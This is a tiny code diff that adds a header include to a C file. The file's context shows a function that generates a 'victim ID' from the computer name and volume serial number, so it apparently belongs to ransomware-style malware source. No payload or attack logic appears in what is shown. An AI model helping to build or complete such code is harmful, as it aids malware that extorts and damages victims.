@@ -7,6 +7,8 @@
 
 #include "mbedtls/base64.h"
 
+#include "get_relative_path.h"
+
 /* Generate victim ID using computer name and volume serial number */
 static int generate_victim_id(char *victim_id, size_t id_size) {
     char comp_name[256];
